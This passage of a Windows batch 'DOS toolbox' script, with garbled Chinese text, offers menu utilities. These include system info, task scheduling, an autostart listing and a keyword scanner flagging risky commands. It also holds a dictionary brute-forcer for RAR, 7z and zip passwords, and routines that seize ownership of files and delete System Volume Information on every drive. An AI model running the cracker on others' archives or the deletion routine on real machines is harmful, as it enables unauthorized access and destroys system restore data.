for /f "tokens=2 delims==" %%a in ('Wmic Printer where "Default='TRUE'" get drivername /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			echo;	!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('wmic sounddev get name /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =����:<nul
			echo;		!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims=]" %%a in ('Wmic Path Win32_NetworkAdapterConfiguration WHERE "IPEnabled='TRUE'" get caption /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =����:<nul
			echo;		!var:~1,-1!
		) else (
			echo;		!var:~1,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('"Wmic path Win32_PerfFormattedData_Tcpip_NetworkInterface get CurrentBandwidth /value 2>nul"') do (
	set /a "cs+=1"
	set netspeed=
	set "netspeed=%%a"
	set "netspeed=!netspeed:~0,-1!"
	set /a "netspeed/=1000000"
	if "!cs!" equ "1" (
		set /p =���������ٶ�:<nul
		echo;	!netspeed! Mbps
		echo;
	) else (
		echo;		!netspeed! Mbps
		echo;
	)
)
set cs=
for /f "tokens=2 delims==" %%a in ('Wmic Path Win32_NetworkAdapterConfiguration WHERE "IPEnabled='TRUE'" get defaultipgateway /value') do (
	set mrwg=
	set "mrwg=%%a"
	set "mrwg=!mrwg:{=!"
	set "mrwg=!mrwg:}=!"
	set "mrwg=!mrwg:"=!"
	set "mrwg=!mrwg:~0,-1!"
	for %%a in (!mrwg!) do (
		set /a "cs+=1"
		if "!cs!" equ "1" (
			set /p =���ص�ַ:<nul
			echo;	%%a
		) else (
			echo;		%%a
		)
	)
)
echo;
if exist %systemroot%\system32\curl.exe (
	ping /n 1 www.baidu.com>nul
	if "!errorlevel!" equ "0" (
		for /f "delims=" %%a in ('curl -s 4.ipw.cn') do (
			set /p =�ⲿIP��ַ:<nul
			echo;	%%a
			echo;
		)
	)
)
set cs=
for /f "tokens=2 delims==" %%a in ('Wmic Path Win32_NetworkAdapterConfiguration WHERE "IPEnabled='TRUE'" get ipaddress /value') do (
	set ipdz=
	set "ipdz=%%a"
	set "ipdz=!ipdz:{=!"
	set "ipdz=!ipdz:}=!"
	set "ipdz=!ipdz:"=!"
	set "ipdz=!ipdz:~0,-1!"
	for %%a in (!ipdz!) do (
		set /a "cs+=1"
		if "!cs!" equ "1" (
			set /p =IP��ַ:<nul
			echo;		%%a
		) else (
			echo;		%%a
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('Wmic Path Win32_NetworkAdapterConfiguration WHERE "IPEnabled='TRUE'" get macaddress /value') do (
	set /a "cs+=1"
	set maxdz=
	set "macdz=%%a"
	set "macdz=!macdz:{=!"
	set "macdz=!macdz:}=!"
	set "macdz=!macdz:"=!"
	set "macdz=!macdz:~0,-1!"
	if "!cs!" equ "1" (
		if defined macdz (
			set /p =����MAC��ַ:<nul
			echo;	!macdz!
		)
	) else (
		if defined macdz (echo;		!macdz!)
	)
)
!hx!
set cs=
for /f "tokens=2 delims==" %%a in ('"wmic memorychip get capacity /value 2>nul"') do (
	set /a "cs+=1"
	set dw=0
	if "!cs!" equ "1" (
		set /p =�ڴ�����:<nul
		call :xdwjs %%a b dw
		echo;	!dw!
	) else (
		call :xdwjs %%a b dw
		if "!dw!" neq "0" (echo;		!dw!)
	)
)
set cs=
for /f "tokens=2 delims==" %%a in ('"wmic memorychip get speed /value 2>nul"') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =�ڴ�Ƶ��:<nul
			echo;	!var:~0,-1! MHz
		) else (
			echo;		!var:~0,-1! MHz
		)
	)
)
systeminfo|find /i "�ڴ�"
!hx!
mode
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:31
setlocal
title ������!system!
cls
echo;��һ������0��С��128����(������128)
!hx!
pause
cls
:d0c
for /l %%a in (1,2,127) do set/p=%%a   <nul
echo;
choice /c YN /n /m �������������������?(Y=��,N=û��)[1\7]
if "%errorlevel%" equ "1" set /a num=1
if "%errorlevel%" equ "2" set /a num=0
set a=2
set b=3
cls
:d1c
for /l %%a in (%a%,1,%b%) do (set/p=%%a   <nul
set/a a=a+2
set/a b=b+2)
if %b% lss 128 goto d1c
echo;
choice /c YN /n /m �������������������?(Y=��,N=û��)[2\7]
if "%errorlevel%" equ "1" set /a num=num+2
if "%errorlevel%" equ "2" set /a num=num
set c=4
set d=7
cls
:d2c
for /l %%a in (%c%,1,%d%) do (set/p=%%a   <nul
set/a c=c+2
set/a d=d+2)
if %d% lss 128 goto d2c
echo;
choice /c YN /n /m �������������������?(Y=��,N=û��)[3\7]
if "%errorlevel%" equ "1" set /a num=num+4
if "%errorlevel%" equ "2" set /a num=num
set e=8
set f=15
cls
:d3c
for /l %%a in (%e%,1,%f%) do (set/p=%%a   <nul
set/a e=e+2
set/a f=f+2)
if %f% lss 128 goto d3c
echo;
choice /c YN /n /m �������������������?(Y=��,N=û��)[4\7]
if "%errorlevel%" equ "1" set /a num=num+8
if "%errorlevel%" equ "2" set /a num=num
set g=16
set h=31
cls
:d4c
for /l %%a in (%g%,1,%h%) do (set/p=%%a   <nul
set/a g=g+2
set/a h=h+2)
if %g% lss 128 goto d4c
echo;
choice /c YN /n /m �������������������?(Y=��,N=û��)[5\7]
if "%errorlevel%" equ "1" set /a num=num+16
if "%errorlevel%" equ "2" set /a num=num
set i=32
set j=63
cls
:d5c
for /l %%a in (%i%,1,%j%) do (set/p=%%a   <nul
set/a i=i+2
set/a j=j+2)
if %j% lss 128 goto d5c
echo;
choice /c YN /n /m �������������������?(Y=��,N=û��)[6\7]
if "%errorlevel%" equ "1" set /a num=num+32
if "%errorlevel%" equ "2" set /a num=num
set k=64
set l=127
cls
:d6c
for /l %%a in (%k%,1,%l%) do (set/p=%%a   <nul
set/a k=k+2
set/a l=l+2)
if %l% lss 128 goto d6c
echo;
choice /c YN /n /m �������������������?(Y=��,N=û��)[7\7]
if "%errorlevel%" equ "1" set /a num=num+64
if "%errorlevel%" equ "2" set /a num=num
cls
echo;�������Ը��ӵļ����,�ó������������Ǹ�����:!cswz!41;92m %num% !cswz!!ysbak!
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:32
setlocal
title DOS����!system!
cls
!hx!
echo;[1]��ʱ����ָ������
echo;[2]��ʱ����ָ���ļ�
echo;[3]��ʾ���еļƻ�����
echo;[4]ɾ���ƻ�����
echo;[0]���ز˵�
!hx!
set nzxx=
set /p "nzxx=���������ѡ��:"
if "!nzxx!" equ "1" goto 32(1)
if "!nzxx!" equ "2" goto 32(2)
if "!nzxx!" equ "3" goto 32(3)
if "!nzxx!" equ "4" goto 32(4)
if "!nzxx!" equ "0" endlocal&goto memuv2
echo;��������ȷ��ѡ�
call :out 2
endlocal
goto 32
:32(1)
title ��ʱ����ָ������!system!
cls
set txnrmc=
set/p txnrmc=��ָ����������:
!hx!
set txnr=
set/p txnr=����������Ҫ���ѵ�����:
!hx!
set txnrrq=
set/p txnrrq=��������������(��ʽ: yyyy/mm/dd ����2015/08/05):
!hx!
set txnrsj=
set/p txnrsj=����������ʱ��(��ʽ: hh:mm:ss ����09:3:5):
cls
md %temp%\DOS��������ʱĿ¼>nul 2>nul
echo;���ļ�����DOS���������ʱ�ļ���,ɾ�����޷��������е����ݣ�>%temp%\DOS��������ʱĿ¼\˵��.txt
echo;@echo off>"%temp%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo;title %txnrmc%>>"%temp%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo;color f1>>"%temp%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo;echo;>>"%temp%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo;cls>>"%temp%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo;echo;��������:"%txnr%">>"%temp%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo;!hx!>>"%temp%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo;echo;���ļ���DOS������ - ��ʱ����ָ�����ݹ�������>>"%temp%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo;echo;����ʱ��:%date:~0,4%��%date:~5,2%��%date:~8,2%�� %xingqi% %time:~0,8%>>"%temp%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo;!hx!>>"%temp%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
echo;echo;��������˳�^&pause^>nul>>"%temp%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
schtasks /create /tn "%txnrmc%" /tr "%temp%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat" /st %txnrsj% /sd %txnrrq% /sc once&&echo;������%txnrrq% %txnrsj%����
echo;�����ļ��ѱ�����"%temp%\DOS��������ʱĿ¼\%txnrmc% - ��ʱ�����ļ�.bat"
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto 32
:32(2)
title ��ʱ����ָ���ļ�!system!
cls
set dsyxmc=
set/p dsyxmc=��ָ����������:
!hx!
set dsyxlj=
set/p dsyxlj=���϶���Ҫ��ʱ���е��ļ����˴���:
if "%dsyxlj:~0,1%%dsyxlj:~-1%" neq """" for /f "delims=" %%a in ('"echo;%dsyxlj%"') do (set %dsyxlj%="%%~a")
!hx!
set dsyxrq=
set/p dsyxrq=��������������(��ʽ: yyyy/mm/dd ����2015/08/05):
!hx!
set dsyxsj=
set/p dsyxsj=����������ʱ��(��ʽ: hh:mm:ss ����09:3:5):
cls
md %temp%\DOS��������ʱĿ¼>nul 2>nul
echo;���ļ�����DOS���������ʱ�ļ���,ɾ�����޷��������е����ݣ�>%temp%\DOS��������ʱĿ¼\˵��.txt
echo;"%dsyxlj%">"%temp%\DOS��������ʱĿ¼\%dsyxmc% - ��ʱ�����ļ�.bat"
schtasks /create /tn "%dsyxmc%" /tr "%temp%\DOS��������ʱĿ¼\%dsyxmc% - ��ʱ�����ļ�.bat" /st %dsyxsj% /sd %dsyxrq% /sc once&&echo;������%dsyxrq% %dsyxsj%����
echo;�����ļ��ѱ�����"%temp%\DOS��������ʱĿ¼\%dsyxmc% - ��ʱ�����ļ�.bat"
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto 32
:32(3)
title ��ʾ���еļƻ�����!system!
cls
schtasks /query
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto 32
:32(4)
title ɾ���ƻ�����!system!
cls
schtasks /query
!hx!
set rwsc=
set/p rwsc=������Ҫɾ������������:
cls
schtasks /delete /tn "%rwsc%" /f
del/f/q "%temp%\DOS��������ʱĿ¼\%rwsc% - ��ʱ�����ļ�.bat"2>nul
del/f/q "%temp%\DOS��������ʱĿ¼\%rwsc% - ��ʱ�����ļ�.bat"2>nul
dir/a/s %temp%\DOS��������ʱĿ¼\*.bat>nul 2>nul||rd/s/q %temp%\DOS��������ʱĿ¼
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto 32
:33
setlocal
title ��ʱ��!system!
cls
echo;��ʱ����ȷ��0.01��
!hx!
echo;���������ʼ��ʱ(����������ʱ)&pause>nul
set "kssjbk=!time!"
cls
echo;��ʱ���ѿ�ʼ��ʱ,�������ֹͣ��ʱ.&pause>nul
set "jssjbk=!time!"
call :sjc "!kssjbk!" "!jssjbk!" jg format
cls
echo;��ʱ��ʼʱ��: !kssjbk!
echo;��ʱ����ʱ��: !jssjbk!
echo;��ʱ: !jg!
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:34
setlocal
title �������������!system!
cls
set mmws=
set mmxz=
set mmjg=
set mmjs=aA0bB1cC2dD3eE4fF5gG6hH7iI8jJ9kK0lL1mM2nN3oO4pP5qQ6rR7sS8tT9uU0vV1wW2xX3yY4zZ5
set /p "mmws=���������ɵ�����λ��: "
cls
for /l %%a in (1,1,!mmws!) do (
	set /a "mmxz=!random!%%63"
	for %%a in (!mmxz!) do (set "mmjg=!mmjg!!mmjs:~%%a,1!")
)
echo;�����ɵ��������:
echo;!mmjg!
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:35
setlocal
title ɾ��ÿ���̷��µ�System Volume Information�ļ���!system!
cls
echo;���������ʼɾ��System Volume Information�ļ���&pause>nul
cls
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for %%a in (!sypf!) do (
	attrib -s -h -r "%%aSystem Volume Information" 2>nul
	takeown/f "%%aSystem Volume Information" 2>nul
	echo;y|cacls "%%aSystem Volume Information" /t /c /p everyone:f 2>nul
	rd /s /q "%%aSystem Volume Information"2>nul
)
!hx!
echo;ɾ�����
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:36
setlocal
title ������ת����!system!
set shijinzhi=
set erjinzhi=
set shilioujinzhi=
set bajinzhi=
cls
echo;���֧��2147483647��ʮ����ת��
set "cho=120"
!hx!
echo;[1]����ʮ����ת��
echo;[2]���������ת��
echo;[0]���ز˵�
!hx!
!sel!
if "!shuru!" equ "1" (goto 10z)
if "!shuru!" equ "2" (goto 2z)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =��������ȷ��ѡ��!<nul
call :out 2
endlocal
goto 36
:10z
cls
set shijinzhi=
set /p "shijinzhi=������ʮ��������: "
call :checkvar shijinzhi num jg
if "!jg!" equ "0" (goto 10z)
call :10to2 !shijinzhi! erjinzhi
call :10to8 !shijinzhi! bajinzhi
call :10to16 !shijinzhi! shilioujinzhi
cls
echo;ʮ����: !shijinzhi!
echo;������: !erjinzhi!
echo;�˽���: !bajinzhi!
echo;ʮ������: !shilioujinzhi!
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 36
:2z
cls
set srejz=
set /p "srejz=���������������: "
if not defined srejz (goto 2z)
for /f "delims=01" %%a in ("!srejz!") do (goto 2z)
call :2to10 !srejz! sjz
call :10to8 !sjz! bajinzhi
call :10to16 !sjz! shilioujinzhi
cls
echo;ʮ����: !sjz!
echo;������: !srejz!
echo;�˽���: !bajinzhi!
echo;ʮ������: !shilioujinzhi!
!hx!
set /p =�����������<nul&pause>nul
endlocal
goto 36
:77
setlocal
title vbs������!system!
set vbsbds=
set vbsjieguo=
cls
set /p "vbsbds=��������ʽ(e=���ز˵�): "
if not defined vbsbds (endlocal&goto 77)
if /i "!vbsbds!" equ "e" (endlocal&goto memuv2)
echo;msgbox !vbsbds!,"65","VBS������">"%temp%\temp.vbs"
"%temp%\temp.vbs"
del /f /q "%temp%\temp.vbs"
endlocal
goto 77
:guanyu
setlocal
title ����DOS������!system!
for /f "delims=" %%a in ("%0") do (
	if "%%~za" equ "!versize!" (
		set "daxiao1=%%~za�ֽ�"
	) else (
		set "daxiao1=%%~za�ֽ�  (�ļ���С�쳣,�����ѱ��޸�)"
	)
)
if /i "!processor_architecture!" equ "x86" (set bit=32) else (set bit=64)
call :sjc "!dosqssj!" "!time!" jg format
cls
echo;����DOS������
!hx!
echo;�汾: 		1.9.5 (!ver!.!versize!)
echo;����ϵͳ: 	!system:~3! !bit!λ
echo;��Ȩ���� 	2012-2025 Administrator ��������Ȩ��
!hx!
echo;����������:		!jg!
echo;DOS����������·��:	!weizhi!
echo;�ļ���С:		!daxiao1!
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:37
setlocal
title �ı����!system!
cls
!hx!
echo;Ҫ��ʾ����ļ�,���ÿո����·��,��ʾ�ļ��Ժ�:
echo;F=��ʾ�¸��ļ�,Q=�˳�,�Ⱥ���ʾ����,�ո���ʾ��һҳ,�س���ʾ��һ��
!hx!
set wenben=
set /p "wenben=�϶���Ҫ��ʾ���ļ����˴���: "
call :ljjc wenben
if "!errorlevel!" equ "0" (
	set /p =��Ч·��<nul
	call :out 2
	endlocal
	goto 37
)
!hx!
more /e /p "!wenben1"
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:38
title ��ʾ��������û�������!system!
cls
!hx!
gpresult /z
!hx!
set /p =����������ز˵�<nul&pause>nul
goto memuv2
:39
setlocal
title NTFSѹ��!system!
set "cho=12340"
cls
echo;�˹���ֻ������NTFS����,Ҫѹ�����߽�ѹ����ļ�,���ÿո����·��.
!hx!
echo;[1]NTFSѹ��
echo;[2]NTFS��ѹ
echo;[3]NTFSѹ���ļ���
echo;[4]NTFS��ѹ�ļ���
echo;[0]���ز˵�
!hx!
!sel!
if "!shuru!" equ "1" (goto yasuo)
if "!shuru!" equ "2" (goto jieya)
if "!shuru!" equ "3" (goto yasuowjj)
if "!shuru!" equ "4" (goto jieyawjj)
if "!shuru!" equ "5" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =��������ȷ��ѡ��<nul
call :out 2
endlocal
goto 39
:jieya
title NTFS��ѹ!system!
cls
set jieya=
set /p "jieya=�϶���Ҫ��ѹ���ļ����˴���: "
call :ljjc jieya
if "!errorlevel!" equ "0" (
	set /p =��Ч·��<nul
	call :out 2
	goto jieya
)
!hx!
compact /u /a /i /f "!jieya!"
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto 39
:yasuo
title NTFSѹ��!system!
cls
set yasuo=
set /p "yasuo=�϶���Ҫѹ�����ļ����˴���: "
call :ljjc yasuo
if "!errorlevel!" equ "0" (
	set /p =��Ч·��<nul
	call :out 2
	goto yasuo
)
!hx!
compact /c /a /i /f "!yasuo!"
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto 39
:jieyawjj
title NTFS��ѹ�ļ���!system!
cls
set jieya=
set /p "jieya=�϶���Ҫ��ѹ���ļ��е��˴���: "
call :ljjc jieya dir
if "!errorlevel!" equ "0" (
	set /p =��Ч·��<nul
	call :out 2
	goto jieyawjj
)
!hx!
compact /u /a /i /f /s:"!jieya!"
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto 39
:yasuowjj
title NTFSѹ���ļ���!system!
cls
set jieya=
set /p "jieya=�϶���Ҫѹ�����ļ��е��˴���: "
call :ljjc jieya dir
if "!errorlevel!" equ "0" (
	set /p =��Ч·��<nul
	call :out 2
	goto yasuowjj
)
!hx!
compact /c /a /i /f /s:"!jieya!"
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto 39
:40
setlocal
title ��ȡ�ļ�����Ȩ��!system!
cls
echo;�˹���ֻ������NTFS����
!hx!
set ntfswjqx=
set /p "ntfswjqx=�϶���Ҫ��ȡ����Ȩ�޵��ļ������ļ��е��˴���: "
if not defined ntfswjqx (endlocal&goto 40)
call :lj ntfswjqx ntfswjqx
if exist "!ntfswjqx!" (
	set /p =·��������<nul
	call :out 2
	endlocal
	goto 40
)
!hx!
attrib -s -h -r "!ntfswjqx!" 2>nul
takeown /f "!ntfswjqx!" 2>nul
echo;y|cacls "!ntfswjqx!" /t /c /g %username%:f 2>nul
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:41
title ��ʾ����������!system!
cls
!hx!
if /i "!system:~11,1!" equ "x" (
	dir /a /s /b "%systemdrive%\Documents and Settings\%username%\����ʼ���˵�\����\����" 2>nul
	dir /a /s /b "%systemdrive%\Documents and Settings\all users\����ʼ���˵�\����\����" 2>nul
) else (
	dir /a /s /b "%systemdrive%\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
	dir /a /s /b "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 2>nul
) 
echo;
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\WindowsNT\CurrentVersion\Windows\load 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\Userinit 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\Setup 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\Setup 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v taskman 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
for /f "delims=" %%a in ('"reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run 2>nul"') do (if not "%%a" equ "" (echo;%%a&echo;))
!hx!
set /p =����������ز˵�<nul&pause>nul
goto memuv2
:kcd
start mshta "javascript:new ActiveXObject('WMPlayer.OCX').cdromCollection.Item(0).Eject();window.close();"
goto memuv2
:gcd
start mshta "javascript:with (new ActiveXObject('WMPlayer.OCX').cdromCollection.Item(0)){Eject();Eject();}window.close();"
goto memuv2
:42
setlocal
title �����Ķ���!system!
cls
set ydnr=
set /p "ydnr=������Ҫ�Ķ�������: "
start mshta vbscript:createobject("sapi.spvoice").speak("!ydnr!")(window.close)
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:43
setlocal
title �������ļ����շ���!system!
set dx=0
cls
set batfx=
set /p "batfx=�϶�Ҫ�������ļ����˴���: "
call :ljjc batfx
if "!errorlevel!" equ "0" (
	set /p =��Ч·��<nul
	call :out 2
	endlocal
	goto 43
)
!hx!
find /n /i "del" "!batfx!"&&set /a "dx+=1"
find /n /i "rd" "!batfx!"&&set /a "dx+=1"
find /n /i "arp" "!batfx!"&&set /a "dx+=1"
find /n /i "assoc" "!batfx!"&&set /a "dx+=1"
find /n /i "attrib" "!batfx!"&&set /a "dx+=1"
find /n /i "cacls" "!batfx!"&&set /a "dx+=1"
find /n /i "format" "!batfx!"&&set /a "dx+=1"
find /n /i "ftype" "!batfx!"&&set /a "dx+=1"
find /n /i "taskkill" "!batfx!"&&set /a "dx+=1"
find /n /i "taskl" "!batfx!"&&set /a "dx+=1"
find /n /i "reg" "!batfx!"&&set /a "dx+=1"
find /n /i "ren" "!batfx!"&&set /a "dx+=1"
find /n /i "regsvr32" "!batfx!"&&set /a "dx+=1"
find /n /i "rd" "!batfx!"&&set /a "dx+=1"
find /n /i "schtask" "!batfx!"&&set /a "dx+=1"
find /n /i "shutdown" "!batfx!"&&set /a "dx+=1"
!hx!
echo;�������ļ�: !batfx!
echo;Σ�յȼ�: !dx!
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:44
setlocal
title �ļ�����!system!
cls
set sswjm=
set /p "sswjm=������Ҫ�������ļ���(Ĭ����%systemdrive%\������): "
!hx!
dir /a /s !sswjm!
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:45
setlocal
title �޸����𻵵��ļ�!system!
cls
set xfwj=
set /p "xfwj=�϶�Ҫ�޸����ļ����˴���: "
call :ljjc xfwj
if "!errorlevel!" equ "0" (
	set /p =��Ч·��<nul
	call :out 2
	endlocal
	goto 45
)
!hx!
recover "!xfwj!"
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:46
setlocal
title �����ƽ�ѹ��������!system!
cls
set rarazlj=
for /f "skip=2 tokens=3 delims= " %%a in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /v path') do (
	set "rarazlj=%%a"
	set "rarpd=!rarazlj!\Rar.exe"
	set "rarpd7z=!rarazlj!\winrar.exe"
)
cls
if not exist "!rarpd!" (
	echo;û�а�װWinRAR.
	echo;����7-Zip...
	set 7zlj=
	for /f "skip=2 tokens=3 delims= " %%a in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip" /v path') do (
		set "7zlj=%%a"
		set "7zlj=!7zlj!7z.exe"
		set "rarpd=!7zlj!"
		set "rarpd7z=!7zlj!"
	)
)
if not exist "!rarpd!" (
	echo;û���ҵ�7-Zip
	!hx!
	set /p =����������ز˵�<nul&pause>nul
	endlocal
	goto memuv2
)
set yswjlj=
set /p "yswjlj=�϶�Ҫ�ƽ��ѹ�������˴���(e=���ز˵�): "
if /i "!yswjlj!" equ "e" (
	endlocal
	goto memuv2
)
call :ljjc yswjlj
if "!errorlevel!" equ "0" (
	echo;��Ч·��
	call :out 2
	endlocal
	goto 46
)
for /f "delims=" %%a in ("!yswjlj!") do (
	if /i "%%~xa" equ ".rar" (
		set "ysbkzm=.rar"
		goto rarwjok
	)
	if /i "%%~xa" equ ".7z" (
		set "ysbkzm=.7z"
		goto rarwjok
	)
	if /i "%%~xa" equ ".zip" (
		set "ysbkzm=.zip"
		goto rarwjok
	)
	echo;��Ч���ļ���ʽ��
	call :out 2
	endlocal
	goto 46
)
:rarwjok
set pjzd=
set /p "pjzd=�϶��ֵ��ļ����˴���(e=���ز˵�): "
if /i "!pjzd!" equ "e" (
	endlocal
	goto memuv2
)
call :ljjc pjzd
if "!errorlevel!" equ "0" (
	echo;��Ч·��
	call :out 2
	goto rarwjok
)
for /f "delims=" %%a in ("!pjzd!") do (
	if /i "%%~xa" equ ".txt" (
		if /i "!ysbkzm!" equ ".rar" (goto kspj)
		if /i "!ysbkzm!" equ ".7z" (goto kspj1)
		if /i "!ysbkzm!" equ ".zip" (goto kspj1)
	)
	echo;����txt�ļ���
	call :out 2
	goto rarwjok
)
:kspj
!hx!
for /f "usebackq delims=" %%a in ("!pjzd!") do (
	cls
	echo;�����ƽ��ѹ����: "!yswjlj!"
	echo;
	echo;����ʹ�õ��ֵ��ļ�: "!pjzd!"
	echo;
	set "pjmm=%%a"
	echo;���ڳ�������:%%a
	"!rarpd!" t -y -inul -p%%a "!yswjlj!"
	if "!errorlevel!" equ "0" (goto pjcg)
)
:pjsb
!hx!
echo;�ƽ�ʧ�ܣ�
echo;
echo;�ֵ���û����ȷ������
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:pjcg
!hx!
forfiles /p %~dp0 /m %~nx0 /c "%comspec% /c set /p =0x07<nul"
echo;�ƽ�ɹ���
echo;
echo;ѹ����: "!yswjlj!"
echo;��ѹ������:!pjmm!
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:kspj1
!hx!
for /f "usebackq delims=" %%a in ("!pjzd!") do (
	cls
	echo;�����ƽ��ѹ����: "!yswjlj!"
	echo;
	echo;����ʹ�õ��ֵ��ļ�: "!pjzd!"
	echo;
	set "pjmm=%%a"
	echo;���ڳ�������:%%a
	"!rarpd7z!" t -y -inul -p%%a "!yswjlj!"
	if "!errorlevel!" equ "0" (goto pjcg)
)
goto pjsb
:47
setlocal
title Wifi�ȵ�!system!
set "cho=1230"
cls
!hx!
echo;[1]����Wifi�ȵ�
echo;[2]�ر�Wifi�ȵ�
echo;[3]�鿴��������
echo;[0]���ز˵�
